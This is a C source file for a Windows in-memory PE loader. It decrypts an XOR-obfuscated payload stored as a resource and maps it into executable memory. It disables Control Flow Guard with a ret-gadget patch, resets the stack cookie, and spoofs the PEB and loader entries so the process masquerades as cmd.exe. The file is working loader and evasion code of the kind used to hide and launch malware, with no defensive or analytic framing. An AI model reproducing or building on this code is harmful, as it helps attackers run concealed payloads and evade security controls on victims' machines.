#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <intrin.h>
#include "resource.h"    
#include "crypto.h"      

// --- 1. ExitProcess Hook ---
void WINAPI FakeExitProcess(UINT uExitCode) {
    printf("\n[!] PAYLOAD TRIED TO EXIT! ExitCode: %u\n", uExitCode);
    printf("[!] Blocking termination. Press Enter to kill...");
    getchar();
    ExitThread(uExitCode);
}

// --- 2. Identity Spoofing Helpers ---
void PatchPEB(void* newImageBase) {
    __try {
#ifdef _WIN64
        PBYTE pPeb = (PBYTE)__readgsqword(0x60);
        *(PVOID*)(pPeb + 0x10) = newImageBase;
#else
        PBYTE pPeb = (PBYTE)__readfsdword(0x30);
        *(PVOID*)(pPeb + 0x08) = newImageBase;
#endif
        printf("[+] PEB Patched.\n");
    }
    __except (1) { printf("[-] CRASH in PatchPEB!\n"); }
}

void SpoofProcessPath(wchar_t* newPath) {
    __try {
        PBYTE pPeb = (PBYTE)__readgsqword(0x60);
        PBYTE pProcessParameters = *(PBYTE*)(pPeb + 0x20);
        USHORT len = (USHORT)(wcslen(newPath) * sizeof(wchar_t));

        *(USHORT*)(pProcessParameters + 0x60) = len;
        *(USHORT*)(pProcessParameters + 0x60 + 2) = len + 2;
        *(WCHAR**)(pProcessParameters + 0x60 + 8) = newPath;

        *(USHORT*)(pProcessParameters + 0x70) = len;
        *(USHORT*)(pProcessParameters + 0x70 + 2) = len + 2;
        *(WCHAR**)(pProcessParameters + 0x70 + 8) = newPath;
        printf("[+] Process Path Spoofed.\n");
    }
    __except (1) { printf("[-] CRASH in SpoofProcessPath!\n"); }
}

void SpoofLdr(wchar_t* fullPath, wchar_t* baseName) {
    __try {
        PBYTE pPeb = (PBYTE)__readgsqword(0x60);
        PBYTE pLdr = *(PBYTE*)(pPeb + 0x18);
        PBYTE pFirstEntry = *(PBYTE*)(pLdr + 0x10);

        USHORT fullLen = (USHORT)(wcslen(fullPath) * sizeof(wchar_t));
        USHORT baseLen = (USHORT)(wcslen(baseName) * sizeof(wchar_t));

        *(USHORT*)(pFirstEntry + 0x48) = fullLen;
        *(USHORT*)(pFirstEntry + 0x48 + 2) = fullLen + 2;
        *(WCHAR**)(pFirstEntry + 0x48 + 8) = fullPath;

        *(USHORT*)(pFirstEntry + 0x58) = baseLen;
        *(USHORT*)(pFirstEntry + 0x58 + 2) = baseLen + 2;
        *(WCHAR**)(pFirstEntry + 0x58 + 8) = baseName;
        printf("[+] LDR Spoofed.\n");
    }
    __except (1) { printf("[-] CRASH in SpoofLdr!\n"); }
}

// --- 3. Security & CFG Helpers ---
void InitSecurityCookie(LPVOID targetBase, PIMAGE_NT_HEADERS ntHeaders) {
    __try {
        PIMAGE_DATA_DIRECTORY loadConfigDir = &ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_LOAD_CONFIG];
        if (loadConfigDir->Size == 0) return;

        PIMAGE_LOAD_CONFIG_DIRECTORY64 loadConfig = (PIMAGE_LOAD_CONFIG_DIRECTORY64)((PUINT8)targetBase + loadConfigDir->VirtualAddress);
        ULONG_PTR cookieVA = loadConfig->SecurityCookie;
        if (cookieVA == 0) return;

        ULONG_PTR oldBase = ntHeaders->OptionalHeader.ImageBase;
        if (cookieVA >= oldBase && cookieVA < oldBase + ntHeaders->OptionalHeader.SizeOfImage) {
            cookieVA = (ULONG_PTR)targetBase + (cookieVA - oldBase);
        }

        ULONG_PTR newCookie = 0x2B992DDFA232 ^ GetTickCount64();
        if (cookieVA >= (ULONG_PTR)targetBase && cookieVA < (ULONG_PTR)targetBase + ntHeaders->OptionalHeader.SizeOfImage) {
            *(ULONG_PTR*)cookieVA = newCookie;
            printf("[+] Security Cookie Initialized.\n");
        }
    }
    __except (1) { printf("[-] CRASH in InitSecurityCookie!\n"); }
}

void DisableCFG(LPVOID targetBase, PIMAGE_NT_HEADERS ntHeaders) {
    printf("[*] Attempting to Disable CFG...\n");
    __try {
        PIMAGE_DATA_DIRECTORY loadConfigDir = &ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_LOAD_CONFIG];
        if (loadConfigDir->Size == 0) { printf("[-] No Load Config Directory.\n"); return; }

        PIMAGE_LOAD_CONFIG_DIRECTORY64 loadConfig = (PIMAGE_LOAD_CONFIG_DIRECTORY64)((PUINT8)targetBase + loadConfigDir->VirtualAddress);
        ULONG_PTR guardCheckVA = loadConfig->GuardCFCheckFunctionPointer;
        if (guardCheckVA == 0) { printf("[-] GuardCFCheckFunctionPointer is NULL.\n"); return; }

        ULONG_PTR oldBase = ntHeaders->OptionalHeader.ImageBase;
        if (guardCheckVA >= oldBase && guardCheckVA < oldBase + ntHeaders->OptionalHeader.SizeOfImage) {
            guardCheckVA = (ULONG_PTR)targetBase + (guardCheckVA - oldBase);
        }

        HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
        PBYTE pRetGadget = NULL;
        for (int i = 0; i < 0x1000; i++) {
            if (((PBYTE)hNtdll)[i] == 0xC3) {
                pRetGadget = (PBYTE)hNtdll + i;
                break;
            }
        }

        if (pRetGadget && guardCheckVA >= (ULONG_PTR)targetBase && guardCheckVA < (ULONG_PTR)targetBase + ntHeaders->OptionalHeader.SizeOfImage) {
            ULONG_PTR* pSlot = (ULONG_PTR*)guardCheckVA;
            DWORD oldProtect;
            VirtualProtect(pSlot, sizeof(ULONG_PTR), PAGE_READWRITE, &oldProtect);
            *pSlot = (ULONG_PTR)pRetGadget;
            VirtualProtect(pSlot, sizeof(ULONG_PTR), oldProtect, &oldProtect);
            printf("[+] CFG Disabled Successfully.\n");
        }
        else {
            printf("[-] CFG Patch Failed: Gadget not found or Invalid Address.\n");
        }
    }
    __except (1) { printf("[-] CRASH in DisableCFG!\n"); }
}

// --- 4. Import Resolvers (Standard & Delay) ---
void ResolveImports(LPVOID targetBase, PIMAGE_NT_HEADERS ntHeaders) {
    printf("[*] Resolving Standard Imports...\n");
    PIMAGE_DATA_DIRECTORY importDir = &ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
    if (importDir->Size == 0) return;

    PIMAGE_IMPORT_DESCRIPTOR importDesc = (PIMAGE_IMPORT_DESCRIPTOR)((PUINT8)targetBase + importDir->VirtualAddress);

    while (importDesc->Name != 0) {
        char* dllName = (char*)((PUINT8)targetBase + importDesc->Name);
        HMODULE hDll = LoadLibraryA(dllName);
        if (hDll) {
            PIMAGE_THUNK_DATA thunk = (PIMAGE_THUNK_DATA)((PUINT8)targetBase + importDesc->FirstThunk);
            PIMAGE_THUNK_DATA originalThunk = (PIMAGE_THUNK_DATA)((PUINT8)targetBase + importDesc->OriginalFirstThunk);

            while (originalThunk->u1.AddressOfData != 0) {
                FARPROC funcAddr = NULL;
                if (IMAGE_SNAP_BY_ORDINAL(originalThunk->u1.Ordinal)) {
                    funcAddr = GetProcAddress(hDll, (LPCSTR)IMAGE_ORDINAL(originalThunk->u1.Ordinal));
                }
                else {
                    PIMAGE_IMPORT_BY_NAME importByName = (PIMAGE_IMPORT_BY_NAME)((PUINT8)targetBase + originalThunk->u1.AddressOfData);
                    if (_stricmp(importByName->Name, "ExitProcess") == 0) funcAddr = (FARPROC)FakeExitProcess;
                    else funcAddr = GetProcAddress(hDll, importByName->Name);
                }
                if (funcAddr) thunk->u1.Function = (ULONG_PTR)funcAddr;
                thunk++;
                originalThunk++;
            }
        }
        importDesc++;
    }
}

void ResolveDelayImports(LPVOID targetBase, PIMAGE_NT_HEADERS ntHeaders) {
    printf("[*] Resolving Delay Imports...\n");
    PIMAGE_DATA_DIRECTORY delayDir = &ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_DELAY_IMPORT];
    if (delayDir->Size == 0) return;

    PIMAGE_DELAYLOAD_DESCRIPTOR delayDesc = (PIMAGE_DELAYLOAD_DESCRIPTOR)((PUINT8)targetBase + delayDir->VirtualAddress);

    while (delayDesc->DllNameRVA != 0) {
        char* dllName = (char*)((PUINT8)targetBase + delayDesc->DllNameRVA);
        HMODULE hDll = LoadLibraryA(dllName);
        if (hDll) {
            PIMAGE_THUNK_DATA thunk = (PIMAGE_THUNK_DATA)((PUINT8)targetBase + delayDesc->ImportAddressTableRVA);
            PIMAGE_THUNK_DATA originalThunk = (PIMAGE_THUNK_DATA)((PUINT8)targetBase + delayDesc->ImportNameTableRVA);

            while (originalThunk->u1.AddressOfData != 0) {
                FARPROC funcAddr = NULL;
                if (IMAGE_SNAP_BY_ORDINAL(originalThunk->u1.Ordinal)) {
                    funcAddr = GetProcAddress(hDll, (LPCSTR)IMAGE_ORDINAL(originalThunk->u1.Ordinal));
                }
                else {
                    PIMAGE_IMPORT_BY_NAME importByName = (PIMAGE_IMPORT_BY_NAME)((PUINT8)targetBase + originalThunk->u1.AddressOfData);
                    if (_stricmp(importByName->Name, "ExitProcess") == 0) funcAddr = (FARPROC)FakeExitProcess;
                    else funcAddr = GetProcAddress(hDll, importByName->Name);
                }
                if (funcAddr) thunk->u1.Function = (ULONG_PTR)funcAddr;
                thunk++;
                originalThunk++;
            }
        }
        delayDesc++;
    }
}

void ProtectSections(LPVOID targetBase, PIMAGE_NT_HEADERS ntHeaders) {
    PIMAGE_SECTION_HEADER section = IMAGE_FIRST_SECTION(ntHeaders);
    for (int i = 0; i < ntHeaders->FileHeader.NumberOfSections; i++) {
        DWORD oldProtect;
        DWORD protection = PAGE_READONLY;
        if (section[i].Characteristics & IMAGE_SCN_MEM_WRITE) protection = PAGE_READWRITE;
        if (section[i].Characteristics & IMAGE_SCN_MEM_EXECUTE) protection = PAGE_EXECUTE_READ;
        if ((section[i].Characteristics & IMAGE_SCN_MEM_EXECUTE) && (section[i].Characteristics & IMAGE_SCN_MEM_WRITE)) protection = PAGE_EXECUTE_READWRITE;
        VirtualProtect((LPVOID)((PUINT8)targetBase + section[i].VirtualAddress), section[i].SizeOfRawData, protection, &oldProtect);
    }
}

typedef void (WINAPI* _PayloadEntry)();
void RunPayloadSafe(_PayloadEntry entryPoint) {
    printf("[!] JUMPING TO ENTRY POINT at 0x%p...\n", entryPoint);
    printf("Press Enter to JUMP..."); getchar();
    __try {
        entryPoint();
    }
    __except (EXCEPTION_EXECUTE_HANDLER) {
        printf("\n[-] CRITICAL EXCEPTION CAUGHT: 0x%X\n", GetExceptionCode());
        printf("[-] Press Enter to exit..."); getchar();
    }
}

// --- 5. Main Map Function ---
void MapPEToMemory(unsigned char* payload) {
    printf("[*] Parsing Headers...\n");
    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)payload;
    if (dosHeader->e_magic != IMAGE_DOS_SIGNATURE) { printf("[-] Invalid DOS Signature\n"); return; }
    PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)(payload + dosHeader->e_lfanew);

    LPVOID targetBase = VirtualAlloc(NULL, ntHeaders->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!targetBase) return;

    memcpy(targetBase, payload, ntHeaders->OptionalHeader.SizeOfHeaders);
    PIMAGE_SECTION_HEADER section = IMAGE_FIRST_SECTION(ntHeaders);
    for (int i = 0; i < ntHeaders->FileHeader.NumberOfSections; i++) {
        if (section[i].SizeOfRawData > 0) {
            memcpy((PUINT8)targetBase + section[i].VirtualAddress, (PUINT8)payload + section[i].PointerToRawData, section[i].SizeOfRawData);
        }
    }

    // Relocations
    ULONG_PTR delta = (ULONG_PTR)targetBase - ntHeaders->OptionalHeader.ImageBase;
    if (delta != 0) {
        PIMAGE_DATA_DIRECTORY relocDir = &ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
        if (relocDir->Size > 0) {
            PIMAGE_BASE_RELOCATION reloc = (PIMAGE_BASE_RELOCATION)((PUINT8)targetBase + relocDir->VirtualAddress);
            while (reloc->VirtualAddress != 0) {
                DWORD entriesCount = (reloc->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);
                PWORD entry = (PWORD)(reloc + 1);
                for (DWORD i = 0; i < entriesCount; i++) {
                    WORD type = entry[i] >> 12;
                    WORD offset = entry[i] & 0xFFF;
                    if (type == IMAGE_REL_BASED_DIR64) *(PULONG_PTR)((PUINT8)targetBase + reloc->VirtualAddress + offset) += delta;
                    else if (type == IMAGE_REL_BASED_HIGHLOW) *(DWORD*)((PUINT8)targetBase + reloc->VirtualAddress + offset) += (DWORD)delta;
                }
                reloc = (PIMAGE_BASE_RELOCATION)((PUINT8)reloc + reloc->SizeOfBlock);
            }
        }
    }

    ResolveImports(targetBase, ntHeaders);
    ResolveDelayImports(targetBase, ntHeaders); // NEW: Fix cmd.exe crashes

    // Fixes
    InitSecurityCookie(targetBase, ntHeaders);
    DisableCFG(targetBase, ntHeaders);

    ProtectSections(targetBase, ntHeaders);
    FlushInstructionCache(GetCurrentProcess(), targetBase, ntHeaders->OptionalHeader.SizeOfImage);

    // Spoofing
    wchar_t* realPath = L"C:\\Windows\\System32\\cmd.exe";
    PatchPEB(targetBase);
    SpoofProcessPath(realPath);
    SpoofLdr(realPath, L"cmd.exe");

    // Console Handles Fix
    if (AllocConsole()) {
        FILE* fp; freopen_s(&fp, "CONOUT$", "w", stdout); freopen_s(&fp, "CONOUT$", "w", stderr); freopen_s(&fp, "CONIN$", "r", stdin);

        // Propagate handles to PEB so cmd.exe sees them
        PBYTE pPeb = (PBYTE)__readgsqword(0x60);
        PBYTE pParams = *(PBYTE*)(pPeb + 0x20);
        *(HANDLE*)(pParams + 0x20) = GetStdHandle(STD_INPUT_HANDLE);
        *(HANDLE*)(pParams + 0x28) = GetStdHandle(STD_OUTPUT_HANDLE);
        *(HANDLE*)(pParams + 0x30) = GetStdHandle(STD_ERROR_HANDLE);
    }

    _PayloadEntry pEntry = (_PayloadEntry)((PUINT8)targetBase + ntHeaders->OptionalHeader.AddressOfEntryPoint);
    RunPayloadSafe(pEntry);
}

// --- 6. Main ---
int main() {
    char* key = "mysecretkey";
    HRSRC hRes = FindResource(NULL, MAKEINTRESOURCE(IDR_RCDATA1), RT_RCDATA);
    if (!hRes) return 1;

    HGLOBAL hResData = LoadResource(NULL, hRes);
    unsigned char* pResData = (unsigned char*)LockResource(hResData);
    size_t resSize = SizeofResource(NULL, hRes);

    unsigned char* payload = (unsigned char*)malloc(resSize);
    memcpy(payload, pResData, resSize);

    printf("[*] Decrypting...\n");
    XorCipher(payload, resSize, key, strlen(key));

    if (payload[0] == 'M' && payload[1] == 'Z') {
        printf("[+] MZ found.\n");
        MapPEToMemory(payload);
    }
    else {
        XorCipher(payload, resSize, key, strlen(key));
        size_t keyLen = strlen(key);
        for (size_t i = 0; i < resSize - 1; i++) payload[i + 1] ^= key[i % keyLen];
        if (payload[1] == 'M' && payload[2] == 'Z') {
            printf("[+] MZ found (Offset 1).\n");
            MapPEToMemory(payload + 1);
        }
        else {
            printf("[-] Critical: MZ not found.\n"); getchar();
        }
    }
    free(payload);
    return 0;
}